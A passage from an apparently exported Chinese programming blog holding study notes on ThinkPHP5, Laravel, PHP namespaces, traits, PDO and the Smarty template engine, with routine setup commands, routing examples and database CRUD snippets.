| jsonp()         | \think\response\Jsonp                                        | 返回的数据`$data`=[],状态码`$code`=200,头部`$header`=[],参数`$options`=[] | \think\response\Jsonp                        |
| xml()           | 获取\think\response\Xml对象实例                              | 返回的数据`$data`=[],状态码`$code`=200,头部`$header`=[],参数`$options`=[] | \think\response\Xml                          |
| redirect()      | 获取\think\response\Redirect对象实例                         | 重定向地址`$url`=[],额外参数`$params`=[],状态码`$code`=302,隐式转换`$with`=[] | \think\response\Redirect                     |
| abort()         | 抛出HTTP异常                                                 | 状态码或Response对象实例`$code`,错误信息`$message`=null,参数`$header`=[] |                                              |
| halt()          | 调试变量并且中断输出                                         | 调试变量或信息`$var`                                         |                                              |
| token()         | 生成表单令牌                                                 | 令牌名称`$name`='__token__',令牌生成方法`$type`='MD5'        | 字符串                                       |
| load_relation() | 延迟预载入关联查询                                           | 数据集`$resultSet`,关联`$relation`                           | 数组                                         |
| collection()    | 数组转换为数据集对象                                         | 数据集数组`$resultSet`                                       | \think\model\Collection或者\think\Collection |]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>ThinkPHP5</tag>
      </tags>
  </entry>
  <entry>
    <title>框架开发-Laravel</title>
    <url>/2018/11/12/%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91-Laravel/</url>
    <content><![CDATA[
## 0. 准备姿势 (安装部署)

1. composer(依赖管理工具) 安装/使用
   1.1. composer下载

   ```
   `https://getcomposer.org`     [composer官网]
   ```

   1.2. 环境检查
   1.3. 安装
   1.4. 源地址问题

   ```
   `https://developer.aliyun.com/composer` [Composer 阿里镜像]
   ```

   1.5. 使用composer

   ```
   PS. 下载量最高的 100 个 Laravel 扩展包推荐
   https://github.com/summerblue/laravel-package-top-100
   ```

------

2. Laravel安装

2.0 Laravel被称为“全栈”式框架,因为它能够处理从网络服务到数据库管理、HTML生成的一切事情,垂直集成的web开发环境给开发者提供了更好的体验

Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。它可以让你从面条一样杂乱的代码中解脱出来；它可以帮你构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。

2.1. 选择Lravel框架的版本 与 运行环境

Laravel 版本计划
    LTS 与 非LTS
        LTS意为: Long Time Support.
        非LTS: 更新频繁.

```
    Laravel 5.1 LTS – 2015 年 6 月份
        LTS 长久支持版本，Bug修复直到2017年6月份，安全修复直到2018年6月份.
    Laravel 5.2 – 2015 年 12 月份
        一般发行版，提供6个月的Bug修复支持，一年的安全修复支持.
    Laravel 5.3 – 2016 年 8 月份
        一般发行版，提供6个月的Bug修复支持，一年的安全修复支持.
    Laravel 5.4 – 2017 年 1 月份
        一般发行版，提供6个月的Bug修复支持，一年的安全修复支持.
    Laravel 5.5 LTS – 2017 年 7 月份
        下一个版本的LTS版本，会停止Laravel 5.1的Bug修复，安全修复直到2018年7月份.
```

2.2. 安装Laravel

```
`http://laravelacademy.org`

1). 通过Composer 安装 Laravel 安装器
2). 通过Composer Create-Project 新建项目

    composer create-project --prefer-dist laravel/laravel laravel-case 5.5.*
```

```
3). 复制已安装好的 laravel框架
```

2.3. 访问 / 配置虚拟主机

------

## 一. 初识佳人 (基本及配置)

1. Laravel的目录结构

   ![1567586616147](/images/imgs/客户端 浏览器.png)

1.1. Laravel的目录部署

```
    |-- app              应用目录(程序逻辑部分)
    |-- bootstrap        启动和自动载入配置目录
        |-- cache            存放框架启动缓存
        |-- app.php          创建框架应用实例
        |-- autoload.php     自动加载
    |-- config           配置文件目录
        |-- app.php          系统级配置文件
        |-- auth.php         用户身份认证配置文件
        |-- broadcasting.php 事件广播配置文件
        |-- cache.php        缓存配置文件
        |-- compile.php      编译额外文件和类需要的配置文件,一般用户很少用到
        |-- database.php     数据库配置文件
        |-- filesystems.php  文件系统配置文件,这里可以配置云存储参数
        |-- mail.php         电子邮件配置文件
        |-- queue.php        消息队列配置文件
        |-- services.php     可存放第三方服务的配置信息
        |-- session.php      配置session的存储方式和生命周期等信息
        |-- view.php         模板文件配置文件,包含模板目录和编译目录等
    |-- database         数据库迁移和填充文件目录
    |-- public           网站入口目录
        |-- css              前端CSS文件目录
        |-- js               前端JS文件目录
        |-- index.php        入口文件
        |-- .htaccess        Apache服务器用该文件重写URL
        |-- web.config       IIS服务器用该文件重写URL
    |-- resources        视图与原始资源文件目录
        |-- assets           可存放包含LESS、SASS、CoffeeScript在内的原始资源文件
        |-- lang             本地化文件目录
        |-- views            视图文件目录(view层文件就在这里)
    |-- routes           路由目录(3种路由文件)
        |-- web.php          包含的路由都会应用web中间件组
        |-- api.php          包含的路由应用了api中间件组
        |-- console.php      用于定义所有基于闭包的控制台命令
    |-- storage          本地存储:编译后的blade模板等文件目录
        |-- app              可用于存储应用程序所需的一些文件
        |-- framework        该目录下包括缓存、sessions和编译后的视图文件
        |-- logs             日志目录
    |-- tests            自动化测试目录
    |-- vendor           Composer依赖目录(Laravel框架源码和第三方类库)
    |-- .env             环境配置文件
    |-- .env.example     环境配置文件(示例)
    |-- .gitattributes   用于设置文件的对比方式(GIT)
    |-- .gitignore       忽略文件(GIT)
    |-- artisan          控制台命令文件
    |-- composer.json    Composer的依赖关系描述文件
    |-- composer.lock    Composer的锁定版本库文件
    |-- gulpfile.js      前端构建工具gulp的配置文件
    |-- package.json     npm的依赖模块配置文件
    |-- phpunit.xml      php单元测试文件
    |-- readme.md        读我.md
    |-- server.php       PHP内置web服务器的快速调试脚本
```

1.2. App应用目录

```
    @ 表示默认不存在,但可创建的内容
    |-- Console         命令行程序目录(自定义的Artisan命令)
        |-- Commands        包含了用于命令行执行的类,可在该目录下自定义类
        |-- Kernel.php      命令调用内核文件
    |-- Exception       异常处理器
    |-- Http            控制器、中间件以及表单请求等
        |-- Controllers     控制器目录
        |-- Middleware      中间件目录
       @|-- Requests        请求类目录
        |-- Kernel.php      包含http中间件和路由中间件的内核文件
    |-- Providers           服务提供者:绑定服务到容器、注册事件等
    User.php                ORM 模型类(对象关系映射)

   @|-- Events              事件类目录,处理应用事件的
   @|-- Jobs                队列任务
   @|-- Listeners           事件监听器
   @|-- Mail                邮件发送类
   @|-- Notifications       应用发送的所有通知
   @|-- Policies            授权策略类
```

------

2. Laravel的配置

2.1. 开发前的一些配置

```
1).目录权限问题
    /storage
    /vendor
    /bootstrap/cache

2).应用密钥 (APP_KEY)
    php artisan key:genera

3).时区设置

4).清空缓存
    php artisan cache:clear

```

2.2. 开发中用到的配置
    1). 环境配置文件说明
        .env
    2). 访问配置
    3). 配置缓存
        php artisan config:cache
    4). 维护模式(网站一键离线功能)
        php artisan down
        php artisan up

```
5). 错误&日志

```

```
6). HTTP 状态异常

```



------

## 二. 尝试接近 (路由)

1. 路由说明 文件位置



2. 基本路由

```
    Route::get('/get',function(){}); //GET方式
    Route::post('/post',function(){}); //POST方式
    Route::match(['get','post'],'/',function(){});//指定一组 允许的请求方式
    Route::any('/all',function(){});//可响应所有 HTTP请求
    Route::put(...); //不常用
    Route::delete(...); //不常用
    Route::options(...);//不常用
    以上请求方式中,只有get与options不需要csrf验证

```

PS.1  postman 请求工具

3. 参数路由
   3.1. 必选参数
   3.2. 可选参数
   3.3. 约束参数格式
   3.4. 多个参数
4. 命名路由

5. 路由组设置

6. 当前访问的路由信息
   返回数组,包含路由信息
   `$route = Route::current();`
   路由name的名字,放在控制器里执行
   `$name = Route::currentRouteName();`
   控制器里action名称
   `$action = Route::currentRouteAction();`

PS.2 Laravel-Debugbar 调试工具
    用于显示调试 及 错误信息 以方便开发.

------

PS.1 postman 请求工具
可指定模拟GET或POST等多种方式,去请求页面.
下载Postman程序 https://www.getpostman.com/
    GET方式,在URL地址栏里带参数,直接请求即可.
    POST方式: 要设置以下两项
        Headers (请求头数据类型,同表单enctype的默认值)
        Body (请求体)

------

PS.2 Laravel-Debugbar 调试工具
用于显示调试 及 错误信息 以方便开发.
!(只能在开发过程中 使用该扩展包:因为它会 显示框架信息 还对性能有影响)

1.安装 Debugbar
`barryvdh/laravel-debugbar`
https://packagist.org/packages/barryvdh/laravel-debugbar

使用方法,请参考文档!

## 三. 执子之手 (中间件)

0. 中间件介绍
1. 创建中间件
   `php artisan make:middleware Test`
2. 中间件功能设计
3. 注册中间件
   全局中间件:    $middleware
   中间件组:      $middlewareGroups
   指定路由中间件: $routeMiddleware
4. 使用中间件
5. CSRF保护
   HTML表单里设置CSRF令牌
   从CSRF保护中排除指定URL
   JQuery中的CSRF令牌处理

------

## 四. 正式交往 (控制器)

0. 控制器介绍
1. 创建控制器
   使用Artisan命令创建
   php artisan make:controller UserController
   php artisan make:controller OrderController
2. 使用路由访问控制器
   1. 普通访问
   2. 带参数访问
   3. 别名访问
3. 单动作控制器(单功能)
4. 控制器中间件
5. RESTful 资源控制器
   `php artisan make:controller PhotoController --resource`
6. 依赖注入 & 控制器
   0. 依赖注入说明
   1. 构造函数注入
   2. 方法注入
   3. GET参数 与 路由参数 的问题
7. 路由缓存 (基于控制器)
   生成路由缓存: `php artisan route:cache`
   移除路由缓存: `php artisan route:clear`

------

## 五. 提出要求 (HTTP请求)

1. HTTP请求的报文的说明
2. 基本信息获取
3. 请求参数的获取
4. 闪存信息
5. 文件信息处理

------

## 六. 满足要求 (HTTP响应)

1. 返回字串/数组/视图/json
2. 响应-下载
3. 跳转和重定向

------

## 七. 制造美好 (视图)

------

## 八. 人造人计划 (DB数据操作)

1. 连接数据库
2. 原生数据库操作
3. 查询构建器 



--

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>框架开发-PSR/命名空间/trait/smarty</title>
    <url>/2018/09/30/%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91-PSR%20%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%20trait/</url>
    <content><![CDATA[


# PSR 编码规范

```
PHP编码规范PSR（中文版）
https://github.com/PizzaLiu/PHP-FIG
```

====================================

# PDO

1. 复习 PDO
   - 实例化PDO  DSN: mysql:host=127.0.0.1;dbname=xx
   - 设置PDO的连接属性: setAttribute()  
     - 是否自动提交
       属性
           PDO::ATTR_AUTOCOMMIT
       值
           0 关闭 / 1 开启
     - SQL错误处理方式
       属性
           PDO::ATTR_ERRMODE
       值
           PDO::ERRMODE_SILENT    无提示(默认)
           PDO::ERRMODE_WARNING   报错WARNING
           PDO::ERRMODE_EXCEPTION 抛出异常
     - 返回结果集的形式
       属性
           PDO::ATTR_DEFAULT_FETCH_MODE
       值
           PDO::FETCH_ASSOC 关联
           PDO::FETCH_NUM   索引
           PDO::FETCH_OBJ   对象
           PDO::FETCH_BOTH  混合
   - PDO的增删改查
     exec()  返回受影响行数 用于增删改
     query() 返回PDOStatement的实例 用于查询
     处理查询结果集
         fetch() 单条数据/一维数组
         fetchAll() 所有数据/二维数组
         使用foreach遍历PDOStatement对象
   - PDO对象
     setAttribute()  设置连接属性
     getAttribute()  获取连接属性
     exec()          返回受影响行数
     query()         返回查询结果集对象
     lastInsertId()   返回自增ID
   - PDOStatement对象
     fetch()         单条数据
     fetchAll()      所有数据
     rowCount()      受影响行数
   - 预处理
     - 预处理的优点
       - 对用户的数据 进行过滤 提高安全性
       - 提高批量操作的性能
     - SQL的占位符
       - ? 
       - :
     - 绑定参数
       - bindValue()
       - bindParam()
       - execute()
     - 结果集的预处理
       - bindColumn()

```
- 事务操作

    将多条 SQL操作(增删改),作为一个 整体单元 来操作.
    都执行成功 则成功,有一条失败 则都失败.
    InnoDB  支持事务 / 行锁机制

    begin    开启一个事务的回滚点
    rollback 回滚一个事务,回到begin前的状态
    commit   提交一个事务,只有被提交的事务,才会被写入表中

    MySQL 默认是开启 自动提交的.
```



====================================

# 命名空间 (php 5.3 +)

1. 命名空间概述

2. 定义命名空间

语法
     namespace 命名空间名称;
特点
    1. namespace 需要 php 5.3 +
    2. namespace 前面不允许有任何的代码(除了namespace自己)
       它的作用范围 到下一个命名空间开始 或 脚本结束 为止
    3. namespace 只对本脚本起作用
    4. 文件里如果没有定义命名空间,则默认在全局空间之中

3. 定义子命名空间

   namespace a\b\c\d...

4. 在同一个文件中 定义多个命名空间
   1. 不推荐 一般一个文件中只有一个命名空间
   2. 万不得已 建议使用 {}  将对应的代码包裹

5. 使用命名空间：基础

非限定名称
    直接使用函数/类/常量,没有命名空间成分
限定名称
    有命名空间成分,但是不以反斜线开头的. (类似于相对路径)
完全限定名称
    以反斜线开头,又有命名空间成分. (类似于绝对路径)

6. 命名空间 和 动态语言特征

   如果把 函数名/类名/常量名 赋值给变量使用
   在命名空间里 `必须`使用完全限定名称
   PS. 注意完全限定名称时,必须使用单引号.

7. namespace 关键字 和 __NAMESPACE__ 常量

   - namespace 关键字
     - 定义命名空间
     - 用来简化调用
   - __NAMESPACE__ 常量
     - 获取本命名空间的名字

   ::class
       自 PHP 5.5 起，关键词 class 也可用于类名的解析。
       使用 ClassName::class 你可以获取一个字符串，包含了类 ClassName 的完全限定名称。
       这对使用了 命名空间 的类尤其有用。 

8. 使用命名空间：别名/导入
   别名
       use 命名空间 [as 别名];
   导入
       use 命名空间\类名 [as 别名]; 
       只能导入类 不能导入函数

9. 全局空间

namespace {}

10. 使用命名空间：后备全局函数/常量

11. 命名空间的实用

==============================================

# Trait (php 5.4 +)

1. Trait的概述
   Trait 是 PHP5.4 中的新特性，是 PHP 多重继承的一种解决方案。
   例如，需要同时继承两个类或抽象类，
   这将会是件很麻烦的事情，Trait 就是为了解决这个问题。

2. Trait的简单使用
   格式:
       trait 名字 { 属性 + 方法}
   特点:
       1. 不能有常量
       2. 不能被实例化的
       3. 在类中 使用use关键字 来混入trait

3. 多个Trait的引用

   use A,B;

4. Trait之间的嵌套

   一个trait可以由多个trait组成
   可以在trait中 使用use ...

5. Trait的属性

   在trait中 可以定义属性并且可以使用
   但是在使用了use 的类中,不允许重复定义与trait同名的属性

6. Trait的方法优先级

   class 中 如果有和trait重名的方法 则class附带trait
   继承时,trait方法会覆盖class的同名方法

7. Trait的修饰符
   static
       静态的属性只能静态读取,静态的方法可以 动/静 态调用
   abstract
       如果在trait中有抽象方法 则 在use的类中必须实现才可使用

8. Trait冲突
   1. 代替
      insteadof  指定替代的方法
   2. 起别名
      使用 as 给方法起别名

# 模版引擎

1. 什么是模板引擎

   1.1 定义
       模板引擎实现 前后端的分离

   1.2 优势
       分工明确
       程序灵活性
       代码可读性
       提高开发效率

   1.3 问题
       会降低执行效率

   1.4 模板引擎分类
       编译型
       解释型
       置换型

2. 选择 smarty 模板引擎

   2.1 为什么选择smarty
       1). 编译型 速度较快
       2). php 官方推荐
   2.2 smarty 优势
       1). 开源
       2). 插件机制
       3). 模板继承
       4). 缓存控制

3. 安装smarty及初始化配置

   3.1 获取smarty
       http://www.smarty.net/
   3.2 搭建smarty入口文件
       1). 导入smarty
       2). 实例化smarty
       3). 初始化 配置
            配置 模板文件 目录
            配置 编译文件 目录
            配置 配置文件 目录
            配置 缓存文件 目录
            配置 模板变量的定界符
            配置 缓存控制 (开启缓存/缓存时间)
       4). 分配变量 assign()
       5). 加载模板 display()

4. smarty的基本应用

   4.1 程序员(PHP)
       1). smarty初始化配置
       2). 运算操作： 数据库 文件， 数据计算...
       3). 缓存控制， 插件扩展...
   4.2 美工(模版)
       1). 把模板变量放在指定的位置
       2(). 其他操作： 遍历数据、 模板函数...

5. smarty设计的基本语法

   5.1 注释
       `{**}`

   5.2 模板中路径问题
       模版文件中所有的相对路径 都相对于 PHP定位
       link/script/img/a

   5.3 模板中读取变量
       输出规则 同 echo 一致

   5.4 在模板中定义变量
       {assign var="" value=""}
       {assign "param" "value"}
       {$param = value}

   5.5 忽略解析
       {literal}{/literal}

6. smarty模板中的变量应用

   6.1 在模板中遍历 数组
       {foreach}{/foreach}
       {section}{/section}

   6.2 模板中读取内置变量(保留变量)

   ```
       {smarty.post}        POST
       {smarty.get}         GET
       {smarty.request}     请求数据
       {smarty.session}     SESSION
       {smarty.cookies}     COOKIE
       {smarty.server}      服务器信息
       {smarty.const}       常量
       {smarty.version}     Smarty版本
       {smarty.template}    模板文件
       {smarty.current_dir} 模板文件目录
       {smarty.now}         当前时间
       {smarty.ldelim}      左定界符
       {$smarty.rdelim}     右定界符
   ```

7. 缓存控制

   7.1 缓存的配置
       caching           是否开启缓存
       cache_lifetime    缓存时间
       cache_dir         缓存目录

   7.2 默认 一个模板 对应一个缓存

   7.3 一个模板 产生 多个缓存
       display(url, 缓存号);

```
7.4 为缓存 减少开销
    isCached(url, 缓存号);

7.5 清除缓存
    clearCache(url, 缓存号);
    clearCache(url);
    clearAllCache();
```

8. 模板继承
   {extends file=""}
   {block name=""}{/block}

9. 内置函数
   9.1 内置函数
       {include}
       {config_load}
       {extends}
   9.2 内置块状函数
       {foreach}{/foreach}
       {if}{/if}
       {block}{/block}

# smarty模板引擎

> 版本不同,对于PHP的支持也不相同 , 推荐使用3.1.10版本

新建工作目录:

```
	/emplates/i.html
	/emplates/.htaccess(Apache的分布式配置文件)
	/libs(smarty库)
```

配置.htaccess文件,闲置用户直接访问模板引擎

```
	deny from all
```

创建基础配置文件init.php

```
// 1). 导入smarty
require './libs/Smarty.class.php';
// 2). 实例化smarty
$smarty = new Smarty();
// var_dump($smarty);
// 3). 初始化 配置
//         配置 模板文件 目录
$smarty->template_dir = './templates';
//         配置 编译文件 目录
$smarty->compile_dir = './templates_c';
//         配置 配置文件 目录
$smarty->config_dir = './configs';
//         配置 缓存文件 目录
$smarty->cache_dir = './caches';
//         配置 模板变量的定界符  
//   原有定界符为{},可能会和css及js使用冲突,建议修改
//   通常使用{{ }}或<{ }>   甚至<!-- --> 或 << >>
$smarty->left_delimiter = '{{';
$smarty->right_delimiter = '}}';

//         配置 缓存控制 (开启缓存/缓存时间)
           #不设置时间默认一个小时
$smarty->caching = false; #默认false关闭
$smarty->cache_lifetime = 10; #设置10s
```

创建入口文件index.php

```
require './init.php';
//    4). 分配变量 assign()
$smarty->assign('title','标题');
$smarty->assign('content1','内容1');
$smarty->assign('content2','内容2');
$smarty->assign('content3','内容3');
$smarty->assign('content4','内容4');
//    5). 加载模板 display()
$smarty->display('./1.html');

```

注释:

`{* 注释内容 *}` 

路径问题:

- 加载css或图片路径为当前入口位置(index.php)为基准
- 但在加载的css文件中引用图片路径时, 是以当前css文件为基准的

输出类型

> 模板中所有assign输出都是`echo` 机制 , true被解析为1 , false被解析为空字符串 , 不能输出数组 和 对象数据

- 对于数组, 可以使用 `{var_dump($arr)}` 的格式输出 , 也可以使用 `{$arr[2]}` 或 `{$arr.2}` 读取
- 对于obj对象 , 首先需要`$smarty->assign('obj',new User());` ,  然后在html模板中使用`    <p>{$obj->name}</p>` 或 `    <p>{$obj->demo()}</p>` 调用]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>框架开发</tag>
        <tag>trait</tag>
        <tag>smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>框架开发-TP5</title>
    <url>/2018/10/10/%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91-TP5/</url>
    <content><![CDATA[
## 一. 初识佳人 (ThinkPHP 5.0 基本)

### TP5 环境要求

PHP >= 5.4.0
PDO PHP Extension       PDO类
MBstring PHP Extension  多字节字符串函数

> 查询文档手册中mb字符串函数

CURL PHP Extension      钩子/爬虫

### 目录结构

1).部署框架 目录结构

```
        tp5
        ├─application     应用目录
        ├─extend          扩展类库目录（可定义）
        ├─public          网站对外访问目录
        ├─runtime         运行时目录（可定义）(linux777权限)
        ├─vendor          第三方类库目录（Composer）
        ├─thinkphp        框架核心目录
        ├─build.php       自动生成定义文件（参考）
        ├─composer.json   Composer定义文件
        ├─LICENSE.txt     授权说明文件
        ├─README.md       README 文件
        └─think           命令行工具入口
        !(如果在linux环境下面的话,需要给runtime目录755权限)
```

```
PS. 几个关键的路径:
```

```
        目录            说明             常量
        tp5             项目根目录       ROOT_PATH
        tp5/application 应用目录         APP_PATH
        tp5/thinkphp    框架核心目录     THINK_PATH
        tp5/exend       应用扩展目录     EXTEND_PATH
        tp5/vendor      Composer扩展目录 VENDOR_PATH
```

```
-------

2).核心框架 目录的结构
```

```
        ├─thinkphp 框架系统目录(请只读)
        │  ├─lang               语言包目录
        │  ├─library            框架核心类库目录
        │  │  ├─think          think 类库包目录
        │  │  └─traits         系统 traits 目录
        │  ├─tpl                系统模板目录(修改请保留源文件)
        │  │
        │  ├─.htaccess          用于 apache 的重写
        │  ├─.travis.yml        CI 定义文件
        │  ├─base.php           框架基础文件
        │  ├─composer.json      composer 定义文件
        │  ├─console.php        控制台入口文件
        │  ├─convention.php     惯例配置文件
        │  ├─helper.php         助手函数文件（可选）
        │  ├─LICENSE.txt        授权说明文件
        │  ├─phpunit.xml        单元测试配置文件
        │  ├─README.md          README 文件
        │  └─start.php          框架引导文件
```

```
-------

3).默认应用 目录结构:
```

```
        ├─application            应用目录（可设置）
        │  ├─index              模块目录(可更改)(可多模块)
        │  │  ├─config.php     模块配置文件
        │  │  ├─common.php     模块公共文件
        │  │  ├─controller     控制器目录
        │  │  ├─model          模型目录
        │  │  └─view           视图目录
        │  │
        │  ├─command.php        命令行工具配置文件
        │  ├─common.php         应用公共文件
        │  ├─config.php         应用配置文件
        │  ├─tags.php           应用行为扩展定义文件
        │  ├─database.php       数据库配置文件
        │  └─route.php          路由配置文件
```

### 架构总览

### 生命周期

### 入口文件 / 公共资源说明

public/static中的gitignore文件声明了所有该文件中的数据全部不会上传到git

方便采用本地调试 , 远程部署的设计结构(CDN服务/OSS)

### URL访问

### 调试模式

配置: 编程过程中只需要关注应用配置和模块配置就够了

application/config.php中配置

​	开发过程中开启app_debug, app_trace(配置位置为console台), 

​	**注意: 上线后必须将配置还原; 该配置打开可能会影响接口的调试和正常运行**

> phpstorm中可以完成git操作,并配合码云安装IDEA插件

### 控制器

新建模块
    `php think build --module admin` 
新建控制器
   ` php think make:controller admin/User --plain `

### 视图

> PHPstorm快捷键: 
>
> ​	美化 :Ctrl+Alt+L
>
> ​				Ctrl+Alt+Shift+L

## 二. 尝试接近 (CURD 操作 Db类)

### 数据库配置

application/database.php

> 本地使用时使用服务器ip , 和服务器专用账号, 上传时修改为本地ip
>
> 3306  
>
> 表前缀

### 查询数据

```
use think\Db;

 //原生sql
$list = Db::query('select * from users');
$list = Db::query('select * from users where id=?', [3]);

//DB类
$list = Db::table('users')->order(['id'=>'desc'])->select();

//助手函数(无需use think\Db 也可以使用)
$list = db('users')->order(['id'=>'desc'])->select();  
```

### 新增数据

```
//原生sql
$list = Db::execute("insert into users (id, name, age) values (null,'西格玛','22')");
$list = Db::execute('insert into users (id, name, age) values (:id, :name, :age)', ['id' => null, 'name' => 'tiger', 'age' => 13]);

//DB类
$list = Db::table('users')->data(['name'=>'cat','age'=>22])->insert();
$list = Db::table('users')->insert(['name'=>'cat','age'=>22]);
$list = Db::table('users')->insertGetId(['name'=>'cat1','age'=>12]);

//助手函数
$list = db('users')->insert(['name'=>'cat1','age'=>12]);
$list = db('users')->insertGetId(['name'=>'cat3','age'=>12]);
```

### 删除数据

```
//原生sql
$list = Db::execute('delete from users where name="cat1"');

//DB类
$list = Db::table('users')->delete(80); #主键才可以这么玩
$list = Db::table('users')->where(['name'=>'cat'])->delete();
$list = Db::table('users')->where('name','cat')->delete();

//助手函数
$list = db('users')->where('name','tiger')->delete();
```

### 更新数据

```
//原生sql
$list = Db::execute('update users set age=33 where name="西格玛"');

//DB类
$list = Db::table('users')->where(['id'=>'77'])>update(['name'=>'daboluo','age'=>'11']);
$list = Db::table('users')->where('id',77)->update(['name'=>'dalao','age'=>'11']);

//助手函数 
$list = db('users')->where('id',77)->update(['name'=>'dalao01','age'=>'11']);
```

------

> 若设置了表前缀功能 , 将table替换为name即可正常使用

## 三. 探索深入 (路由)

### 1.默认的URL规则

### 2.路由文件

​	1.配置文件目录

​	`application/config.php`

```
 推荐使用强制路由模式,配置后不再使用pathinfo格式的路径模式
 	// 是否开启路由
    'url_route_on'           => true,
    // 是否强制使用路由
	'url_route_must'         => true,
```

​	2.路由设置目录

​    `application/route.php`

```
use think\Route
//设置路由格式
Route::get('/','index/index/index');  
```

### 3.路由概念/规则

```
    从规则上区分 路由分为: 动态路由 和 静态路由 两种
    从设置方式上 路由分为: 动态注册 和 静态注册 两种

    路由规则中 包含变量的 就是动态路由,没有包含任何变量的称为静态路由.
    在路由文件中 return数组的 路由形式, 称之为 静态注册
    使用Route类的方法 注册的路由 称之为 动态注册(5.0推荐)
    以上两者 可同时使用.
```

### 3.定义路由

```
use think\Route
//设置路由格式
Route::get('/','index/index/index');  
Route::post('ppp','index/index/ppp');
//无参数模式
Route::get('/user','index/index/user');
//必须传参数模式
Route::get('/user/:id','index/index/user');
//可有可无参数模式
Route::get('/user/[:id]','index/index/user');
//匹配参数(只能匹配指定的参数,多了报错)
Route::get('/user/[:id]$','index/index/user');
//闭包
Route::get('/user:id',function($id){
	//执行体
});
```

### 4.闭包定义

### 5.路由参数

```
// 动态注册
// Route::rule('路由表达式','路由地址','请求类型','路由参数(数组)','变量规则(数组)');
Route::get('/userlist','admin/user/index',['ext'=>'html|shtml']);  #限制后缀名
```



### 6.变量规则

​    `php think make:controller index/Blog --plain`

```
若使用非路由模式,真实访问路径为:
http://www.tp5.com/index/blog/index/id/123
http://www.tp5.com/index/blog/read/name/naxx
http://www.tp5.com/index/blog/article/year/2015/month/11/day/20

使用路由控制
Route::get('/blog/:id$','index/blog/index',[],['id'=>'\d+']);
Route::get('blog/:name$','index/blog/read',[],['name'=>'\w+']);
Route::get('/blog/:year/:month/:day','index/blog/article',[],['year'=>'\d{4}','month'=>'\d{2}','day'=>'\d{2}']);
之后的路由路径变为:
http://www.tp5.com/blog/22
http://www.tp5.com/blog/anna
http://www.tp5.com/blog/2015/12/12
```

> 解决路由拦截的方法有两种 , 一种是将拦截范围越大的路由越向后移, 一种是在路由路径后加 `$` 截断 

### 7.路由分组

```
// 路由分组用来处理同一个模块下的不同路由
Route::group('blog', [
    ':id$' => 
        [
            'index/blog/index', 
            ['get'], 
            ['id' => '\d+']
        ],
    ':name$' => 
        [
            'index/blog/read', 
            ['get'], 
            ['name' => '\w+']
        ],
    ':year/:month/:day' => 
        [
            'index/blog/article', 
            ['get'], 
            ['year' => '\d{4}', 'month' => '\d{2}', 'day' => '\d{2}']
        ],
]);

```



### 8.生成URL地址

> 使用函数方法url()
>
> 或Url::bulid()

```
use think\Url;
echo Url::build('index/index/user','id=4444');
	# /user/4444.html
echo Url::build('index/index/user',['id'=>'43']);
	# /user/43.html
// 多参数模式
echo Url::build('index/blog/read',['name'=>'annakalina'],'xhtml',true);
	# http://www.tp5.com/blog/annakalina.xhtml
echo Url::build('index/blog/read',['name'=>'annakalina'],'xhtml','www.hao123.com');
	# http://www.hao123.com/blog/annakalina.xhtml
echo Url::build('index/blog/read@www.hao123.com',['name'=>'annakalina'],'xhtml');
	# http://www.hao123.com/blog/annakalina.xhtml
```

**第一个参数为pathinfo路径 , 第二个参数为参数 , 第三个参数为扩展名 , 第四个参数为域名(true表示当前域名 , 也可以写入其他域名)**  

------



------

## 四. 正式交往 (控制器)

### 控制器概念

- 接收路由分配过来的请求
- 接收各种的参数
- 调用模型 取得数据
- 调用模版 输出页面
- 业务逻辑 流程控制/分支/循环.
- 业务分层

### 控制器的定义

### 控制器初始化

> __construct()可能覆盖掉继承的父类同名方法,
>
> 应使用tp5中的_initialize()方法

前置操作: `$beforeActionList` 

```
// ['except' => '方法名,方法名'] #除了指定的方法之外都执行
// ['only' => '方法名,方法名']  #只有指定的方法可以执行
// 实例:
protected $beforeActionList = [
	'first',
	'second' => ['except'=>'hello'],
	'third' => ['only'=>'hello,data'],
]
```



### 跳转和重定向

1. 页面 跳转(存在缓冲时间)jump

```
use think\Controller;
return $this->success('程序执行成功','admin/user/index');
return $this->error('程序执行失败','admin/user/index');
```

> 第二个参数在路由表中包含指定路由的情况下可以直接写pathinfo路径

```
更改固有模板
模板路径: thinkphp/tpl/dispatch_jump.tpl
复制到模板所在目录,修改模板所在目录config.php文件
//配置文件
return [
    'dispatch_error_tmpl' => APP_PATH . 'admin/view/index/jump.html',
//默认成功跳转对应的模板文件
    'dispatch_success_tmpl' => APP_PATH . 'admin/view/index/jump.html',
];
即完成了更换模块模板文件的操作
```

2. 重定向(直接转)redirect

```
use think\Controller;
return $this->redirect('index/index/user','id=5');
return $this->redirect('http://bilibili.com');
```





### 空操作

### 空控制器

> 对于混合路由有效 , 访问到不存在的方法和类时触发 



------

## 五. 执子之手

 (增删改查 用户管理实例 RESTful资源控制器)

### 生成 rest模块的 User资源控制器

`php think build --module rest`
`php think make:controller rest/User`

### RESTful架构说明

www.ruanyifeng.com/blog/2011/09/restful.html
www.ruanyifeng.com/blog/2014/05/restful_api.html
www.ruanyifeng.com/blog/2018/10/restful-api-best-practices.html

![1567586616147](/images/imgs/1567586616147.png)

### 注册资源路由

```
在路由表中添加
Route::resource('users','rest/user');
```

```
// 动态注册
// Route::rule('路由表达式','路由地址','请求类型','路由参数（数组）','变量规则（数组）');
    路由规则:URL访问规则（包括静态规则和动态规则）,只有符合规则的路由才能正确访问;
    路由地址:实际访问的地址（可以是控制器操作、类的方法或者闭包）;
    请求类型:表示当前路由生效使用的请求类型,包括GET/POST/PUT/DELETE等,如果希望任何请求都能访问使用*号（默认值）。
    路由参数:路由匹配的条件约束或设置参数（用于检测或者解析）;
    路由变量:路由规则里面的动态变量以及PATH_INFO里面的参数都称之为路由变量;
    变量规则:路由规则中的变量的匹配规则（正则表达式）;

    支持任意请求规则
    Route::rule('new/:id','News/update');
    定义GET请求路由规则
    Route::get('new/:id','News/read');
